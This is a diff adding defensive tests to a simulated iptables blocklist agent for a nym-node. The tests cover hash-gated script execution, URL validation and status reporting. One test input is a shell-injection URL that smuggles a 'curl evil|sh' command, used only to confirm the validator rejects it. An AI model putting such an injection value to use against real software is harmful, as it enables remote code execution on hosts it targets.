@@ -4,6 +4,8 @@ Simulates the systemd + iptables world so we can exercise install-only,
 install+restart (with a nym-node flush/reapply), verify and remove without
 touching the host. Run: python3 test_extra_blocks.py
 """
+import hashlib
+import inspect
 import io
 import os
 import sys
@@ -205,6 +207,33 @@ rd2 = agent.act_extra_blocks_install({"restart_node": False})
 check("reinstall over maestro's own files is not flagged as a replacement",
       rd2["replaced_existing"] is False
       and not os.path.exists(agent.EB_SH + ".maestro.bak"))
+
+# 12. install-script runs orchestrator-pushed content over mTLS, gated on sha256
+_iss = agent.EXEC_ACTIONS["extra_blocks_install_script"]
+check("install-script rejects missing content", _iss({}).get("ok") is False)
+check("install-script rejects a wrong sha256",
+      _iss({"content": "echo hi", "sha256": "deadbeef"}).get("ok") is False)
+check("install-script rejects content with no sha256 (hash is mandatory)",
+      _iss({"content": "echo hi"}).get("ok") is False)
+_body = "#!/bin/bash\necho maestro-ok\n"
+check("install-script runs content whose sha256 matches",
+      _iss({"content": _body, "sha256": hashlib.sha256(_body.encode()).hexdigest()}).get("ok") is True)
+check("install-script no longer fetches from the internet",
+      "installer_url" not in inspect.getsource(_iss) and "urlopen" not in inspect.getsource(_iss))
+
+# 13. blocklist URL injection is rejected before it can reach a root shell
+check("_EB_URL_OK accepts a clean https URL",
+      agent._EB_URL_OK("https://example.org/blocklist.txt"))
+check("_EB_URL_OK rejects shell metacharacters in the URL",
+      not agent._EB_URL_OK('https://x"; curl evil|sh; :"'))
+check("built-in script reads LIST_URL from a file, not baked-in interpolation",
+      'LIST_URL="$(cat ' in agent.EB_SCRIPT and "__LIST_URL__" not in agent.EB_SCRIPT)
+
+# 14. status surfaces chain_present so a dead NYM-EXIT isn't a silent green "Active"
+_st = agent._extra_blocks_state()
+check("status includes chain_present when installed", "chain_present" in _st)
+check("_eb_chain_summary returns the 5-tuple incl. chain_present",
+      len(agent._eb_chain_summary()) == 5)
 
 print(f"\n{ok} passed, {fail} failed")
 raise SystemExit(1 if fail else 0)
